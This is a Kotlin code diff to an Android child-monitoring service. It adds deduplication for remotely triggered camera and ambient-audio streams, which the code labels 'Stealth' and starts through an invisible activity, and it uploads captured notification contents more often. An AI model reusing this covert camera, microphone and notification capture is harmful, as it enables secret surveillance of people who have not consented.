@@ -45,6 +45,8 @@ class ChildMonitoringService : Service() {
     private lateinit var api: ApiClient
     private var mediaSafetyObserver: com.example.childapp.safety.MediaSafetyObserver? = null
     private var callLogObserver: android.database.ContentObserver? = null
+    @Volatile private var lastHandledCameraSessionId: String? = null
+    @Volatile private var lastHandledAudioSessionId: String? = null
 
     override fun onCreate() {
         super.onCreate()
@@ -143,8 +145,12 @@ class ChildMonitoringService : Service() {
         ChildAccessibilityService.activeSocketCallback = { entry ->
             socket.sendBrowsingActivity(entry)
         }
+        com.example.childapp.notification.ChildNotificationListenerService.ensureListenerBound(this)
         com.example.childapp.notification.ChildNotificationListenerService.activeSocketCallback = { entry ->
             socket.sendNotificationIncoming(entry)
+            serviceScope.launch {
+                syncPendingNotifications()
+            }
         }
 
         socket.onConnected = {
@@ -259,45 +265,61 @@ class ChildMonitoringService : Service() {
 
         socket.onCameraStreamRequest = { sessionId, _, cameraFacing, withAudio ->
             Log.i(TAG, "Camera stream requested for session $sessionId (Stealth)")
-            socket.acceptCameraStream(sessionId)
-
-            val isSameSession = CameraStreamService.isSessionRunning.get() && CameraStreamService.currentSessionId == sessionId
-            if (isSameSession) {
-                Log.i(TAG, "Camera streaming session $sessionId is already active, skipping duplicate start")
+            if (lastHandledCameraSessionId == sessionId) {
+                Log.i(TAG, "Duplicate camera_stream_request for $sessionId ignored")
             } else {
-                if (CameraStreamService.isSessionRunning.get()) {
-                    Log.i(TAG, "New camera stream request received while old session was active. Stopping old session first.")
-                    CameraStreamService.stop(this)
+                lastHandledCameraSessionId = sessionId
+                socket.acceptCameraStream(sessionId)
+
+                val isSameSession = CameraStreamService.isSessionRunning.get() && CameraStreamService.currentSessionId == sessionId
+                if (isSameSession) {
+                    Log.i(TAG, "Camera streaming session $sessionId is already active, skipping duplicate start")
+                } else {
+                    if (CameraStreamService.isSessionRunning.get()) {
+                        Log.i(TAG, "New camera stream request received while old session was active. Stopping old session first.")
+                        CameraStreamService.stop(this)
+                    }
+                    InvisibleCameraActivity.launch(this, token, sessionId, cameraFacing, withAudio)
                 }
-                InvisibleCameraActivity.launch(this, token, sessionId, cameraFacing, withAudio)
             }
         }
 
         socket.onCameraStreamStopped = { sessionId ->
             Log.i(TAG, "Camera stream stopped for session $sessionId")
-            CameraStreamService.stop(this)
+            if (CameraStreamService.currentSessionId == null || CameraStreamService.currentSessionId == sessionId) {
+                CameraStreamService.stop(this)
+            }
         }
 
         socket.onAudioStreamRequest = { sessionId, _ ->
             Log.i(TAG, "Ambient audio stream requested for session $sessionId (Stealth)")
-            socket.acceptAudioStream(sessionId)
-
-            val isSameSession = com.example.childapp.audio.AmbientAudioService.isSessionRunning.get() &&
-                    com.example.childapp.audio.AmbientAudioService.currentSessionId == sessionId
-            if (isSameSession) {
-                Log.i(TAG, "Ambient audio session $sessionId is already active, skipping duplicate start")
+            if (lastHandledAudioSessionId == sessionId) {
+                Log.i(TAG, "Duplicate audio_stream_request for $sessionId ignored")
             } else {
-                if (com.example.childapp.audio.AmbientAudioService.isSessionRunning.get()) {
-                    Log.i(TAG, "New audio stream request received while old session was active. Stopping old session first.")
-                    com.example.childapp.audio.AmbientAudioService.stop(this)
+                lastHandledAudioSessionId = sessionId
+                socket.acceptAudioStream(sessionId)
+
+                val isSameSession = com.example.childapp.audio.AmbientAudioService.isSessionRunning.get() &&
+                        com.example.childapp.audio.AmbientAudioService.currentSessionId == sessionId
+                if (isSameSession) {
+                    Log.i(TAG, "Ambient audio session $sessionId is already active, skipping duplicate start")
+                } else {
+                    if (com.example.childapp.audio.AmbientAudioService.isSessionRunning.get()) {
+                        Log.i(TAG, "New audio stream request received while old session was active. Stopping old session first.")
+                        com.example.childapp.audio.AmbientAudioService.stop(this)
+                    }
+                    InvisibleCameraActivity.launchForAudio(this, token, sessionId)
                 }
-                com.example.childapp.audio.AmbientAudioService.start(this, token, sessionId)
             }
         }
 
         socket.onAudioStreamStopped = { sessionId ->
             Log.i(TAG, "Ambient audio stream stopped for session $sessionId")
-            com.example.childapp.audio.AmbientAudioService.stop(this)
+            if (com.example.childapp.audio.AmbientAudioService.currentSessionId == null ||
+                com.example.childapp.audio.AmbientAudioService.currentSessionId == sessionId
+            ) {
+                com.example.childapp.audio.AmbientAudioService.stop(this)
+            }
         }
 
         socket.connect()
@@ -383,38 +405,42 @@ class ChildMonitoringService : Service() {
                 }
 
                 // Sync Notification Records
-                try {
-                    val unsyncedNotifications = LocalDatabase.getInstance(this@ChildMonitoringService)
-                        .getUnsyncedNotifications(100)
-                    if (unsyncedNotifications.isNotEmpty()) {
-                        val batchArray = JSONArray()
-                        val isoFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
-                            timeZone = TimeZone.getTimeZone("UTC")
-                        }
-                        for (entry in unsyncedNotifications) {
-                            batchArray.put(JSONObject().apply {
-                                put("externalId", entry.externalId)
-                                put("packageName", entry.packageName)
-                                put("appName", entry.appName)
-                                put("title", entry.title)
-                                put("content", entry.content)
-                                entry.subText?.let { put("subText", it) }
-                                put("postTime", isoFormat.format(Date(entry.postTime)))
-                            })
-                        }
-                        val res = api.syncNotificationsBatch(batchArray)
-                        if (res.optBoolean("success", false) || res.has("processedCount")) {
-                            LocalDatabase.getInstance(this@ChildMonitoringService)
-                                .markNotificationsSynced(unsyncedNotifications.map { it.id })
-                            Log.i(TAG, "Successfully synced ${unsyncedNotifications.size} notification records")
-                        }
-                    }
-                } catch (e: Exception) {
-                    Log.w(TAG, "Failed to sync notifications: ${e.message}")
-                }
+                syncPendingNotifications()
             } catch (e: Exception) {
                 Log.e(TAG, "Error syncing app data", e)
             }
+        }
+    }
+
+    private suspend fun syncPendingNotifications() {
+        try {
+            val unsyncedNotifications = LocalDatabase.getInstance(this@ChildMonitoringService)
+                .getUnsyncedNotifications(100)
+            if (unsyncedNotifications.isNotEmpty()) {
+                val batchArray = JSONArray()
+                val isoFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
+                    timeZone = TimeZone.getTimeZone("UTC")
+                }
+                for (entry in unsyncedNotifications) {
+                    batchArray.put(JSONObject().apply {
+                        put("externalId", entry.externalId)
+                        put("packageName", entry.packageName)
+                        put("appName", entry.appName)
+                        put("title", entry.title)
+                        put("content", entry.content)
+                        entry.subText?.let { put("subText", it) }
+                        put("postTime", isoFormat.format(Date(entry.postTime)))
+                    })
+                }
+                val res = api.syncNotificationsBatch(batchArray)
+                if (res.optBoolean("success", false) || res.has("processedCount")) {
+                    LocalDatabase.getInstance(this@ChildMonitoringService)
+                        .markNotificationsSynced(unsyncedNotifications.map { it.id })
+                    Log.i(TAG, "Successfully synced ${unsyncedNotifications.size} notification records")
+                }
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "Failed to sync notifications: ${e.message}")
         }
     }
 
@@ -432,11 +458,25 @@ class ChildMonitoringService : Service() {
                     socketManager?.sendHeartbeat(batteryLevel, isGpsOn, deviceName)
 
                     heartbeatCounter++
+                    com.example.childapp.notification.ChildNotificationListenerService.ensureListenerBound(this@ChildMonitoringService)
+                    syncPendingNotifications()
+
                     if (heartbeatCounter % 3 == 0) {
                         try {
                             val report = AppUsageTracker.generateTodayUsageReport(this@ChildMonitoringService)
                             api.syncDailyUsage(report)
                             socketManager?.sendUsageUpdated(report)
+                        } catch (_: Exception) {}
+                    }
+
+                    // Periodic background refresh of web rules and policies every ~3 minutes (7 * 25s)
+                    if (heartbeatCounter % 7 == 0) {
+                        try {
+                            val webResp = api.getMyWebRules()
+                            if (webResp.has("rules")) {
+                                LocalDatabase.getInstance(this@ChildMonitoringService)
+                                    .saveWebRules(webResp.getJSONArray("rules"))
+                            }
                         } catch (_: Exception) {}
                     }
                 } catch (e: Exception) {
